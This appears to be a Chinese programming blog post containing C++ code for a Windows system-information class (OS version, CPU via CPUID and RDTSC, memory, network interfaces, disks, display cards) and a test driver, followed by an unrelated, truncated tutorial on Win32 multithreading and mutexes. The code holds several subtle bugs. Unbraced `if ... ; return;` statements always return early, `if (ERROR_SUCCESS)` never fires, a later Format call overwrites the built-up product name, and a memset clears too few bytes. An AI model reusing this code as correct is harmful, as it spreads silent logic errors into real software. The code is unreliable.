	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if( !(bOsVersionInfoEx = GetVersionEx ((OSVERSIONINFO *) &osvi)) )
	{
		osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
		GetVersionEx ( (OSVERSIONINFO *) &osvi);
	}


	GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), 
		"GetNativeSystemInfo");

	GetSystemInfo(&si);
	switch (osvi.dwPlatformId)
	{
	case VER_PLATFORM_WIN32_NT:
		if ( osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0 )
		{
			if( osvi.wProductType == VER_NT_WORKSTATION )
			{
				str.Format(_T("Windows Vista "));
			}
			else 
			{
				str.Format(_T("Windows Server \"Longhorn\" "));
			}
		}
		if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2 )
		{
			if( GetSystemMetrics(SM_SERVERR2) )
			{
				str.Format(_T("Microsoft Windows Server 2003 \"R2\" "));
			}
			else if( osvi.wProductType == VER_NT_WORKSTATION &&
				si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64)
			{
				str.Format(_T("Microsoft Windows XP Professional x64 Edition "));
			}
			else 
			{
				str.Format(_T("Microsoft Windows Server 2003, "));
			}
		}

		if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1 )
		{
			str.Format(_T("Microsoft Windows XP "));
		}

		if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0 )
			str.Format(_T("Microsoft Windows 2000 "));

		if ( osvi.dwMajorVersion <= 4 )
		{
			str.Format(_T("Microsoft Windows NT "));
		}

		// Test for specific product on Windows NT 4.0 SP6 and later.
		if( bOsVersionInfoEx )
		{

			//将Service Pack 版本保存
			strServiceVersion.Format(_T("Service Pack %d"),osvi.wServicePackMajor);

			// Test for the workstation type.
			if ( osvi.wProductType == VER_NT_WORKSTATION &&
				si.wProcessorArchitecture!=PROCESSOR_ARCHITECTURE_AMD64)
			{
				if( osvi.dwMajorVersion == 4 )
					str = str + _T("Workstation 4.0");
				else if( osvi.wSuiteMask & VER_SUITE_PERSONAL )
					str = str + _T("Home Edition");
				else str = str + _T( "Professional");
			}

			// Test for the server type.
			else if ( osvi.wProductType == VER_NT_SERVER || 
				osvi.wProductType == VER_NT_DOMAIN_CONTROLLER )
			{
				if(osvi.dwMajorVersion==5 && osvi.dwMinorVersion==2)
				{
					if ( si.wProcessorArchitecture ==
						PROCESSOR_ARCHITECTURE_IA64 )
					{
						if( osvi.wSuiteMask & VER_SUITE_DATACENTER )
							str = str + _T("Datacenter Edition for Itanium-based Systems");
						else if( osvi.wSuiteMask & VER_SUITE_ENTERPRISE )
							str = str + _T("Enterprise Edition for Itanium-based Systems");
					}

					else if ( si.wProcessorArchitecture ==
						PROCESSOR_ARCHITECTURE_AMD64 )
					{
						if( osvi.wSuiteMask & VER_SUITE_DATACENTER )
							str = str + _T( "Datacenter x64 Edition ");
						else if( osvi.wSuiteMask & VER_SUITE_ENTERPRISE )
							str = str + _T( "Enterprise x64 Edition ");
						else str = str + _T( "Standard x64 Edition ");
					}

					else
					{
						if( osvi.wSuiteMask & VER_SUITE_DATACENTER )
							str = str + _T( "Datacenter Edition ");
						else if( osvi.wSuiteMask & VER_SUITE_ENTERPRISE )
							str = str + _T( "Enterprise Edition ");
						else if ( osvi.wSuiteMask & VER_SUITE_BLADE )
							str = str + _T( "Web Edition ");
						else str = str + _T( "Standard Edition ");
					}
				}
				else if(osvi.dwMajorVersion==5 && osvi.dwMinorVersion==0)
				{
					if( osvi.wSuiteMask & VER_SUITE_DATACENTER )
						str = str + _T("Datacenter Server ");
					else if( osvi.wSuiteMask & VER_SUITE_ENTERPRISE )
						str = str + _T( "Advanced Server ");
					else str = str + _T( "Server ");
				}
				else  // Windows NT 4.0 
				{
					if( osvi.wSuiteMask & VER_SUITE_ENTERPRISE )
						str = str + _T ("Server 4.0, Enterprise Edition ");
					else str = str + _T ( "Server 4.0 " );
				}
			}
		}
		// Test for specific product on Windows NT 4.0 SP5 and earlier
		else  
		{
			HKEY hKey;
			TCHAR szProductType[256];
			DWORD dwBufLen=256*sizeof(TCHAR);
			LONG lRet;

			lRet = RegOpenKeyEx( HKEY_LOCAL_MACHINE,
				_T("SYSTEM\\CurrentControlSet\\Control\\ProductOptions"), 0, KEY_QUERY_VALUE, &hKey );
			if( lRet != ERROR_SUCCESS )
				strOSVersion = str;
				return;

			lRet = RegQueryValueEx( hKey, TEXT("ProductType"),
				NULL, NULL, (LPBYTE) szProductType, &dwBufLen);
			RegCloseKey( hKey );

			if( (lRet != ERROR_SUCCESS) ||
				(dwBufLen > 256*sizeof(TCHAR)) )
				strOSVersion = str;
				return;

			if ( lstrcmpi( TEXT("WINNT"), szProductType) == 0 )
				str = str + _T( "Workstation ");
			if ( lstrcmpi( TEXT("LANMANNT"), szProductType) == 0 )
				str = str + _T( "Server " );
			if ( lstrcmpi( TEXT("SERVERNT"), szProductType) == 0 )
				str = str + _T( "Advanced Server ");
			str.Format(_T( "%d.%d "), osvi.dwMajorVersion, osvi.dwMinorVersion );
		}

		// Display service pack (if any) and build number.

		if( osvi.dwMajorVersion == 4 && 
			lstrcmpi( osvi.szCSDVersion, TEXT("Service Pack 6") ) == 0 )
		{ 
			HKEY hKey;
			LONG lRet;

			// Test for SP6 versus SP6a.
			lRet = RegOpenKeyEx( HKEY_LOCAL_MACHINE,
				_T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Hotfix\\Q246009"), 0, KEY_QUERY_VALUE, &hKey );
			if( lRet == ERROR_SUCCESS )
				str.Format(_T( "Service Pack 6a (Build %d)\n"), 
				osvi.dwBuildNumber & 0xFFFF );         
			else // Windows NT 4.0 prior to SP6a
			{
				_tprintf( TEXT("%s (Build %d)\n"),
					osvi.szCSDVersion,
					osvi.dwBuildNumber & 0xFFFF);
			}

			RegCloseKey( hKey );
		}
		else // not Windows NT 4.0 
		{
			_tprintf( TEXT("%s (Build %d)\n"),
				osvi.szCSDVersion,
				osvi.dwBuildNumber & 0xFFFF);
		}

		break;

		// Test for the Windows Me/98/95.
	case VER_PLATFORM_WIN32_WINDOWS:

		if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
		{
			str.Format(_T("Microsoft Windows 95 "));
			if (osvi.szCSDVersion[1]=='C' || osvi.szCSDVersion[1]=='B')
				str = str + _T("OSR2 ");
		} 

		if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 10)
		{
			str.Format(_T("Microsoft Windows 98 "));
			if ( osvi.szCSDVersion[1]=='A' || osvi.szCSDVersion[1]=='B')
				str = str + _T("SE ");
		} 
		if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 90)
		{
			str.Format(_T("Microsoft Windows Millennium Edition\n"));
		} 
		break;

	case VER_PLATFORM_WIN32s:
		str.Format(_T("Microsoft Win32s\n"));
		break;
	default:
		break;
	}

	strOSVersion = str;
}

BOOL GetSysInfo::IsWow64() 
{ 
	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL); 
	LPFN_ISWOW64PROCESS fnIsWow64Process; 
	BOOL bIsWow64 = FALSE; 
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( GetModuleHandle(_T("kernel32")),"IsWow64Process"); 
	if (NULL != fnIsWow64Process) 
	{ 
		fnIsWow64Process(GetCurrentProcess(),&bIsWow64);
	} 
	return bIsWow64; 
} 

void GetSysInfo::GetCpuInfo(CString &chProcessorName,CString &chProcessorType,DWORD &dwNum,DWORD &dwMaxClockSpeed)
{

	CString strPath=_T("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");//注册表子键路径
	CRegKey regkey;//定义注册表类对象
	LONG lResult;//LONG型变量－反应结果
	lResult=regkey.Open(HKEY_LOCAL_MACHINE,LPCTSTR(strPath),KEY_ALL_ACCESS); //打开注册表键
	if (lResult!=ERROR_SUCCESS)
	{
		return;
	}
	WCHAR chCPUName[50] = {0};
	DWORD dwSize=50; 

	//获取ProcessorNameString字段值
	if (ERROR_SUCCESS == regkey.QueryStringValue(_T("ProcessorNameString"),chCPUName,&dwSize))
	{
		chProcessorName = chCPUName;
	}

	//查询CPU主频
	DWORD dwValue;
	if (ERROR_SUCCESS == regkey.QueryDWORDValue(_T("~MHz"),dwValue))
	{
		dwMaxClockSpeed = dwValue;
	}
	regkey.Close();//关闭注册表
	//UpdateData(FALSE);

	//获取CPU核心数目
	SYSTEM_INFO si;
	memset(&si,0,sizeof(SYSTEM_INFO));
	GetSystemInfo(&si);
	dwNum = si.dwNumberOfProcessors;

	switch (si.dwProcessorType)
	{
	case PROCESSOR_INTEL_386:
		{
			chProcessorType.Format(_T("Intel 386 processor"));
		}
		break;
	case PROCESSOR_INTEL_486:
		{
			chProcessorType.Format(_T("Intel 486 Processor"));
		}
		break;
	case PROCESSOR_INTEL_PENTIUM:
		{
			chProcessorType.Format(_T("Intel Pentium Processor"));
		}
		break;
	case PROCESSOR_INTEL_IA64:
		{
			chProcessorType.Format(_T("Intel IA64 Processor"));
		}
		break;
	case PROCESSOR_AMD_X8664:
		{
			chProcessorType.Format(_T("AMD X8664 Processor"));
		}
		break;
	default:
		chProcessorType.Format(_T("未知"));
		break;
	}

	//GetDisplayName()
}

void  GetSysInfo::GetMemoryInfo(CString &dwTotalPhys,CString &dwTotalVirtual) 
{ 
	//   TODO:     Add   extra   initialization   here 
	MEMORYSTATUS   Mem; 
	//   get   the   memory   status 
	GlobalMemoryStatus(&Mem); 

	DWORD dwSize = (DWORD)Mem.dwTotalPhys/(1024*1024); 
	DWORD dwVirtSize = (DWORD)Mem.dwTotalVirtual/(1024*1024);

	dwTotalPhys.Format(_T("物理内存:%ld MB"),dwSize); 
	dwTotalVirtual.Format(_T("虚拟内存:%ld MB"),dwVirtSize);
}

int GetSysInfo::GetInterFaceCount()
{
	/*CGetNetData pNet;
	DWORD pCount = pNet.GetNetworkInterfacesCount();
	return pCount;*/


	try
	{
#define DEFAULT_BUFFER_SIZE 40960L

		unsigned char *data = (unsigned char*)malloc(DEFAULT_BUFFER_SIZE);
		DWORD type;
		DWORD size = DEFAULT_BUFFER_SIZE;
		DWORD ret;

		char s_key[4096];
		sprintf_s(s_key , 4096 , "510");
		//RegQueryValueEx的固定调用格式		
		CString str(s_key);

		//如果RegQueryValueEx函数执行失败则进入循环
		while((ret = RegQueryValueEx(HKEY_PERFORMANCE_DATA, str, 0, &type, data, &size)) != ERROR_SUCCESS)
		{
			Sleep(10);
			//如果RegQueryValueEx的返回值为ERROR_MORE_DATA(申请的内存区data太小，不能容纳RegQueryValueEx返回的数据)
			if(ret == ERROR_MORE_DATA) 
			{
				Sleep(10);
				size += DEFAULT_BUFFER_SIZE;
				data = (unsigned char*) realloc(data, size);//重新分配足够大的内存

				ret = RegQueryValueEx(HKEY_PERFORMANCE_DATA, str, 0, &type, data, &size);//重新执行RegQueryValueEx函数
			} 
			//如果RegQueryValueEx返回值仍旧未成功则函数返回.....(注意内存泄露“free函数”~~~)。
			//这个if保证了这个while只能进入一次~~~避免死循环
			if(ret != ERROR_SUCCESS)
			{
				if (NULL != data)
				{
					free(data);
					data = NULL;
				}
				return 0;//0个接口
			}
		}

		//函数执行成功之后就是对返回的data内存中数据的解析了，这个建议去查看MSDN有关RegQueryValueEx函数参数数据结构的说明
		//得到数据块		
		PERF_DATA_BLOCK	 *dataBlockPtr = (PERF_DATA_BLOCK *)data;
		//得到第一个对象
		PERF_OBJECT_TYPE *objectPtr = (PERF_OBJECT_TYPE *) ((BYTE *)dataBlockPtr + dataBlockPtr->HeaderLength);

		for(int a=0 ; a<(int)dataBlockPtr->NumObjectTypes ; a++) 
		{
			char nameBuffer[255] = {0};
			if(objectPtr->ObjectNameTitleIndex == 510) 
			{
				DWORD processIdOffset = ULONG_MAX;
				PERF_COUNTER_DEFINITION *counterPtr =(PERF_COUNTER_DEFINITION *) ((BYTE *)objectPtr + objectPtr->HeaderLength);

				for(int b=0 ; b<(int)objectPtr->NumCounters ; b++) 
				{
					if(counterPtr->CounterNameTitleIndex == 520)
						processIdOffset = counterPtr->CounterOffset;

					counterPtr =(PERF_COUNTER_DEFINITION *) ((BYTE *) counterPtr + counterPtr->ByteLength);
				}

				if(processIdOffset == ULONG_MAX) {
					if(data != NULL)
					{
						free(data);
						data = NULL;
					}
					return 0;
				}

				PERF_INSTANCE_DEFINITION *instancePtr =(PERF_INSTANCE_DEFINITION *)  ((BYTE *) objectPtr + objectPtr->DefinitionLength);

				for(int b=0 ; b<objectPtr->NumInstances ; b++) 
				{
					wchar_t *namePtr = (wchar_t *) ((BYTE *)instancePtr + instancePtr->NameOffset);
					PERF_COUNTER_BLOCK *counterBlockPtr = (PERF_COUNTER_BLOCK *) ((BYTE *)instancePtr + instancePtr->ByteLength);
		
					char pName[256] = {0};
					WideCharToMultiByte(CP_ACP, 0, namePtr, -1, pName, sizeof(nameBuffer), 0, 0);

					DWORD bandwith = *((DWORD *) ((BYTE *)counterBlockPtr + processIdOffset));				
					DWORD tottraff = 0;

					Interfaces.AddTail(CString(pName)); //各网卡的名称
					Bandwidths.AddTail(bandwith);       //带宽
					TotalTraffics.AddTail(tottraff);    // 流量初始化为0

					PERF_COUNTER_BLOCK  *pCtrBlk = (PERF_COUNTER_BLOCK *) ((BYTE *)instancePtr + instancePtr->ByteLength);

					
					instancePtr = (PERF_INSTANCE_DEFINITION *) ((BYTE *)instancePtr + instancePtr->ByteLength + pCtrBlk->ByteLength);
				}
			}
			objectPtr = (PERF_OBJECT_TYPE *) ((BYTE *)objectPtr + objectPtr->TotalByteLength);
		}
		if(data != NULL)
		{
			free(data);
			data = NULL;
		}
	}
	catch(...)
	{
		return 0;
	}
	return Interfaces.GetCount();
}

void GetSysInfo::GetInterFaceName(CString &InterfaceName,int pNum)
{
	/*CGetNetData pNet;
	pNet.GetNetworkInterfaceName(&InterfaceName,pNum);*/

	POSITION pos = Interfaces.FindIndex(pNum);
	if(pos==NULL)
		return ;

	InterfaceName = Interfaces.GetAt(pos);
	pos = Bandwidths.FindIndex(pNum);
	if (pos == NULL)
		return;
	DWORD dwBandwidth = Bandwidths.GetAt(pos);

	CString str;
	str.Format(_T("%d"),dwBandwidth);

	InterfaceName = InterfaceName + str;
}

void GetSysInfo::GetDiskInfo(DWORD &dwNum,CString chDriveInfo[])
{
	DWORD DiskCount = 0;

	//利用GetLogicalDrives()函数可以获取系统中逻辑驱动器的数量，函数返回的是一个32位无符号整型数据。
	DWORD DiskInfo = GetLogicalDrives();

	//通过循环操作查看每一位数据是否为1，如果为1则磁盘为真,如果为0则磁盘不存在。
	while(DiskInfo)
	{
		//通过位运算的逻辑与操作，判断是否为1
		Sleep(10);
		if(DiskInfo&1)
		{
			DiskCount++;
		}
		DiskInfo = DiskInfo >> 1;//通过位运算的右移操作保证每循环一次所检查的位置向右移动一位。*/
	}

	if (dwNum < DiskCount)
	{
		return;//实际的磁盘数目大于dwNum
	}
	dwNum = DiskCount;//将磁盘分区数量保存


	//-------------------------------------------------------------------//
	//通过GetLogicalDriveStrings()函数获取所有驱动器字符串信息长度
	int DSLength = GetLogicalDriveStrings(0,NULL);

	  WCHAR* DStr = new WCHAR[DSLength];
	  memset(DStr,0,DSLength);

	  //通过GetLogicalDriveStrings将字符串信息复制到堆区数组中,其中保存了所有驱动器的信息。
	  GetLogicalDriveStrings(DSLength,DStr);

	  int DType;
	  int si=0;
	  BOOL fResult;
	  unsigned _int64 i64FreeBytesToCaller;
	  unsigned _int64 i64TotalBytes;
	  unsigned _int64 i64FreeBytes;

	  //读取各驱动器信息，由于DStr内部数据格式是A:\NULLB:\NULLC:\NULL，所以DSLength/4可以获得具体大循环范围
	  for(int i=0;i<DSLength/4;++i)
	  {
		  Sleep(10);
		  CString strdriver = DStr+i*4;
		  CString strTmp,strTotalBytes,strFreeBytes;
		  DType = GetDriveType(strdriver);//GetDriveType函数，可以获取驱动器类型，参数为驱动器的根目录
		  switch (DType)
		  {
		  case DRIVE_FIXED:
			  {
				  strTmp.Format(_T("本地磁盘"));
			  }
		  	break;
		  case DRIVE_CDROM:
			  {
				  strTmp.Format(_T("DVD驱动器"));
			  }
			  break;
		  case DRIVE_REMOVABLE:
			  {
				  strTmp.Format(_T("可移动磁盘"));
			  }
			  break;
		  case DRIVE_REMOTE:
			  {
				  strTmp.Format(_T("网络磁盘"));
			  }
			  break;
		  case DRIVE_RAMDISK:
			  {
				  strTmp.Format(_T("虚拟RAM磁盘"));
			  }
			  break;
		  case DRIVE_UNKNOWN:
			  {
				  strTmp.Format(_T("虚拟RAM未知设备"));
			  }
			  break;
		  default:
			  strTmp.Format(_T("未知设备"));
			  break;
		  }

		  //GetDiskFreeSpaceEx函数，可以获取驱动器磁盘的空间状态,函数返回的是个BOOL类型数据
		  fResult = GetDiskFreeSpaceEx (strdriver,
			  (PULARGE_INTEGER)&i64FreeBytesToCaller,
			  (PULARGE_INTEGER)&i64TotalBytes,
			  (PULARGE_INTEGER)&i64FreeBytes);
		      
		  if(fResult)
		  {
			  strTotalBytes.Format(_T("磁盘总容量%fMB"),(float)i64TotalBytes/1024/1024);
			  strFreeBytes.Format(_T("磁盘剩余空间%fMB"),(float)i64FreeBytesToCaller/1024/1024);
		  }
		  else
		  {
			  strTotalBytes.Format(_T(""));
			  strFreeBytes.Format(_T(""));
		  }
		  chDriveInfo[i] = strTmp + _T("(") + strdriver + _T("):") + strTotalBytes + strFreeBytes;
		  si+=4;
	  }
}

void GetSysInfo::GetDisplayCardInfo(DWORD &dwNum,CString chCardName[])
{
	HKEY keyServ;
	HKEY keyEnum;
	HKEY key;
	HKEY key2;
	LONG lResult;//LONG型变量－保存函数返回值

	//查询"SYSTEM\\CurrentControlSet\\Services"下的所有子键保存到keyServ
	lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("SYSTEM\\CurrentControlSet\\Services"),0,KEY_READ,&keyServ);
	if (ERROR_SUCCESS != lResult)
		return;


	//查询"SYSTEM\\CurrentControlSet\\Enum"下的所有子键保存到keyEnum
	lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("SYSTEM\\CurrentControlSet\\Enum"),0,KEY_READ,&keyEnum);
	if (ERROR_SUCCESS != lResult)
		return;

	int i = 0,count = 0;
	DWORD size = 0,type = 0;
	for (;;++i)
	{
		Sleep(5);
		size = 512;
		TCHAR name[512] = {0};//保存keyServ下各子项的字段名称

		//逐个枚举keyServ下的各子项字段保存到name中
		lResult = RegEnumKeyEx(keyServ,i,name,&size,NULL,NULL,NULL,NULL);

		//要读取的子项不存在，即keyServ的子项全部遍历完时跳出循环
		if(lResult == ERROR_NO_MORE_ITEMS)
			break;

		//打开keyServ的子项字段为name所标识的字段的值保存到key
		lResult = RegOpenKeyEx(keyServ,name,0,KEY_READ,&key);
		if (lResult != ERROR_SUCCESS)
		{
			RegCloseKey(keyServ);
			return;
		}
		

		size = 512;
		//查询key下的字段为Group的子键字段名保存到name
		lResult = RegQueryValueEx(key,TEXT("Group"),0,&type,(LPBYTE)name,&size);
		if(lResult == ERROR_FILE_NOT_FOUND)
		{
			//?键不存在
			RegCloseKey(key);
			continue;
		};



		//如果查询到的name不是Video则说明该键不是显卡驱动项
		if(_tcscmp(TEXT("Video"),name)!=0)
		{
			RegCloseKey(key);
			continue;     //返回for循环
		};
		
		//如果程序继续往下执行的话说明已经查到了有关显卡的信息，所以在下面的代码执行完之后要break第一个for循环，函数返回
		lResult = RegOpenKeyEx(key,TEXT("Enum"),0,KEY_READ,&key2);
		RegCloseKey(key);
		key = key2;
		size = sizeof(count);
		lResult = RegQueryValueEx(key,TEXT("Count"),0,&type,(LPBYTE)&count,&size);//查询Count字段（显卡数目）

		dwNum = count;//保存显卡数目
		for(int j=0;j <count;++j)
		{
			TCHAR sz[512] = {0};
			TCHAR name[64] = {0};
			wsprintf(name,TEXT("%d"),j);
			size = sizeof(sz);
			lResult  = RegQueryValueEx(key,name,0,&type,(LPBYTE)sz,&size);


			lResult = RegOpenKeyEx(keyEnum,sz,0,KEY_READ,&key2);
			if (ERROR_SUCCESS)
			{
				RegCloseKey(keyEnum);
				return;
			}
			

			size = sizeof(sz);
			lResult = RegQueryValueEx(key2,TEXT("FriendlyName"),0,&type,(LPBYTE)sz,&size);
			if(lResult == ERROR_FILE_NOT_FOUND)
			{
				size = sizeof(sz);
				lResult = RegQueryValueEx(key2,TEXT("DeviceDesc"),0,&type,(LPBYTE)sz,&size);
				chCardName[j] = sz;//保存显卡名称
			};
			RegCloseKey(key2);
			key2 = NULL;
		};
		RegCloseKey(key);
		key = NULL;
		break;
	}
}

 
下面是
Test_cpu.cpp:
 
 
 
 
// Test_cpu.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
// Test_cpu.cpp : 定义控制台应用程序的入口点。
//

//=====================================================================================
/*                 CPUID指令是intel IA32架构下获得CPU信息的汇编指令，
                   可以得到CPU类型，型号，制造商信息，商标信息，序列号，
                   缓存等一系列CPU相关的东西。
*/
#include "stdafx.h"
//#include <windows.h>
#include "GetsysInfo.h"
#include <iostream>
#include <string>

using namespace std;


//用来存储eax,ebx,ecx,edx四个寄存器的信息
DWORD deax;
DWORD debx;
DWORD decx;
DWORD dedx;

void ExeCPUID(DWORD veax)  //初始化CPU
{
__asm
{
    mov eax,veax
    cpuid
    mov deax,eax
    mov debx,ebx
    mov decx,ecx
    mov dedx,edx
}
}

/*    在Intel Pentium以上级别的CPU中，有一个称为“时间戳（Time Stamp）”的部件，
    它以64位无符号整型数的格式，记录了自CPU上电以来所经过的时钟周期数。
    由于目前的CPU主频都非常高，因此这个部件可以达到纳秒级的计时精度。
    这个精确性是上述两种方法所无法比拟的。
    在Pentium以上的CPU中，提供了一条机器指令RDTSC（Read Time Stamp Counter）
    来读取这个时间戳的数字，并将其保存在EDX:EAX寄存器对中
*/
long GetCPUFreq()       //获取CPU频率,单位: MHZ
{
    int start,over;
    _asm 
    {
        RDTSC
        mov start,eax
    }
    Sleep(50);
    _asm 
    {
        RDTSC
        mov over,eax
    }
    return (over-start)/50000;
}



/*   把eax = 0作为输入参数，可以得到CPU的制造商信息。
     cpuid指令执行以后，会返回一个12字符的制造商信息，
     前四个字符的ASC码按低位到高位放在ebx，中间四个放在edx，最后四个字符放在ecx。
*/
string GetManID()   //获取制造商信息
{
    char ID[25];        
    memset(ID,0,sizeof(ID));
    
    ExeCPUID(0);          //初始化
    memcpy(ID+0,&debx,4); //制造商信息复制到数组
    memcpy(ID+4,&dedx,4);
    memcpy(ID+8,&decx,4);
    
    return string(ID);
}


/*  在我的电脑上点击右键，选择属性，可以在窗口的下面看到一条CPU的信息，
    这就是CPU的商标字符串。CPU的商标字符串也是通过cpuid得到的。
    由于商标的字符串很长(48个字符)，所以不能在一次cpuid指令执行时全部得到，
    所以intel把它分成了3个操作，eax的输入参数分别是0x80000002,0x80000003,0x80000004，
    每次返回的16个字符，按照从低位到高位的顺序依次放在eax, ebx, ecx, edx。
    因此，可以用循环的方式，每次执行完以后保存结果，然后执行下一次cpuid。
*/
string GetCPUType()
{
    const DWORD id = 0x80000002; //从0x80000002开始,到0x80000004结束
    char CPUType[49];//用来存储CPU型号信息
    memset(CPUType,0,sizeof(CPUType));//初始化数组
    
    for(DWORD t = 0 ; t < 3 ; t++ )
    {
        ExeCPUID(id+t);
        //每次循环结束,保存信息到数组
        memcpy(CPUType+16*t+ 0,&deax,4);
        memcpy(CPUType+16*t+ 4,&debx,4);
        memcpy(CPUType+16*t+ 8,&decx,4);
        memcpy(CPUType+16*t+12,&dedx,4);
    }
    
    return string(CPUType);
}

void main() 
{ 
    cout<<"本机CPU信息如下:"<<endl;
    cout<<"CPU 主 频: "<<GetCPUFreq()<<" MHZ"<<endl;
    cout<<"CPU 制造商: "<<GetManID()<<endl;
    cout<<"CPU 型 号: "<<GetCPUType()<<endl;
   // cin.get();


	cout<<"------------------------------------------"<<endl;
	DWORD dwnum = 0 ;
	CString info[20];
	CString totalmemery,totalvirtual;
	GetSysInfo* sys = new GetSysInfo();
	//sys->GetDiskInfo(dwnum,info);
	//sys->GetMemoryInfo(totalmemery,totalvirtual);
	//wstring total = totalmemery.GetBuffer(0);
	//wstring processname = chProcessorName.GetBuffer(0);
	//wcout<<total<<endl;
	//wcout<<totalvirtual.GetBuffer(0)<<endl;



	CString chProcessorName;
	CString chProcessorType;
	DWORD dwNum;
	DWORD dwMaxClockSpeed;
	sys->GetCpuInfo( chProcessorName, chProcessorType, dwNum, dwMaxClockSpeed);
	//wstring processname = chProcessorName.GetBuffer(0);//unicode要使用对应版本的函数
	wcout<<chProcessorName.GetBuffer(0)<<endl;
	wcout<<chProcessorType.GetBuffer(0)<<endl;
	delete sys;

	getchar();

}



效果：
 








 
 
线程是进程的一条执行路径，它包含独立的堆栈和CPU寄存器状态，每个线程共享所有的进程资源，包括打开的文件、信号标识及动态分配的内存等。一个进程内的所有线程使用同一个地址空间，而这些线程的执行由系统调度程序控制，调度程序决定哪个线程可执行以及什么时候执行线程。线程有优先级别，优先权较低的线程必须等到优先权较高的线程执行完后再执行。在多处理器的机器上，调度程序可将多个线程放到不同的处理器上去运行，这样可使处理器任务平衡，并提高系统的运行效率。 
Windows是一种多任务的操作系统，在Windows的一个进程内包含一个或多个线程。32位Windows环境下的Win32 API提供了多线程应用程序开发所需要的接口函数，而利用ＶＣ中提供的标准Ｃ库也可以开发多线程应用程序，相应的ＭＦＣ类库封装了多线程编程的类，用户在开发时可根据应用程序的需要和特点选择相应的工具。为了使大家能全面地了解Windows多线程编程技术，本文将重点介绍Win32 API和MFC两种方式下如何编制多线程程序。 
多线程编程在Win32方式下和MFC类库支持下的原理是一致的，进程的主线程在任何需要的时候都可以创建新的线程。当线程执行完后，自动终止线程; 当进程结束后，所有的线程都终止。所有活动的线程共享进程的资源，因此，在编程时需要考虑在多个线程访问同一资源时产生冲突的问题。当一个线程正在访问某进程对象，而另一个线程要改变该对象，就可能会产生错误的结果，编程时要解决这个冲突。 
Win32 API下的多线程编程 

Win32 API是Windows操作系统内核与应用程序之间的界面，它将内核提供的功能进行函数包装，应用程序通过调用相关函数而获得相应的系统功能。为了向应用程序提供多线程功能，Win32 API函数集中提供了一些处理多线程程序的函数集。直接用Win32 API进行程序设计具有很多优点: 基于Win32的应用程序执行代码小，运行效率高，但是它要求程序员编写的代码较多，且需要管理所有系统提供给程序的资源。用Win32 API直接编写程序要求程序员对Windows系统内核有一定的了解，会占用程序员很多时间对系统资源进行管理，因而程序员的工作效率降低。 
1. 用Win32函数创建和终止线程 

Win32函数库中提供了操作多线程的函数，包括创建线程、终止线程、建立互斥区等。在应用程序的主线程或者其他活动线程中创建新的线程的函数如下： 

HANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,DWORD dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId); 
如果创建成功则返回线程的句柄，否则返回NULL。创建了新的线程后，该线程就开始启动执行了。但如果在dwCreationFlags中使用了CREATE_SUSPENDED特性，那么线程并不马上执行，而是先挂起，等到调用ResumeThread后才开始启动线程，在这个过程中可以调用下面这个函数来设置线程的优先权： 
BOOL SetThreadPriority(HANDLE hThread,int nPriority); 
当调用线程的函数返回后，线程自动终止。如果需要在线程的执行过程中终止则可调用函数： 
VOID ExitThread(DWORD dwExitCode); 
如果在线程的外面终止线程，则可调用下面的函数： 
BOOL TerminateThread(HANDLE hThread,DWORD dwExitCode); 
但应注意: 该函数可能会引起系统不稳定，而且线程所占用的资源也不释放。因此，一般情况下，建议不要使用该函数。 
如果要终止的线程是进程内的最后一个线程，则线程被终止后相应的进程也应终止。 2. 线程的同步 

在线程体内，如果该线程完全独立，与其他线程没有数据存取等资源操作上的冲突，则可按照通常单线程的方法进行编程。但是，在多线程处理时情况常常不是这样，线程之间经常要同时访问一些资源。由于对共享资源进行访问引起冲突是不可避免的，为了解决这种线程同步问题，Win32 API提供了多种同步控制对象来帮助程序员解决共享资源访问冲突。在介绍这些同步对象之前先介绍一下等待函数，因为所有控制对象的访问控制都要用到这个函数。 
Win32 API提供了一组能使线程阻塞其自身执行的等待函数。这些函数在其参数中的一个或多个同步对象产生了信号，或者超过规定的等待时间才会返回。在等待函数未返回时，线程处于等待状态，此时线程只消耗很少的CPU时间。使用等待函数既可以保证线程的同步，又可以提高程序的运行效率。最常用的等待函数是： 
DWORD WaitForSingleObject(HANDLE hHandle，DWORD dwMilliseconds); 
而函数WaitForMultipleObject可以用来同时监测多个同步对象，该函数的声明为： 
DWORD WaitForMultipleObject(DWORD nCount,CONST HANDLE *lpHandles,BOOL bWaitAll,DWORD dwMilliseconds); 
（1）互斥体对象 
Mutex对象的状态在它不被任何线程拥有时才有信号，而当它被拥有时则无信号。Mutex对象很适合用来协调多个线程对共享资源的互斥访问。可按下列步骤使用该对象： 
首先，建立互斥体对象，得到句柄： 
HANDLE CreateMutex(); 
然后，在线程可能产生冲突的区域前（即访问共享资源之前）调用WaitForSingleObject，将句柄传给函数，请求占用互斥对象： 
dwWaitResult = WaitForSingleObject(hMutex,5000L); 
共享资源访问结束，释放对互斥体对象的占用： 
ReleaseMutex(hMutex); 
互斥体对象在同一时刻只能被一个线程占用，当互斥体对象被一个线程占用时，若有另一线程想占用它，则必须等到前一线程释放后才能成功。 
（2）信号对象 
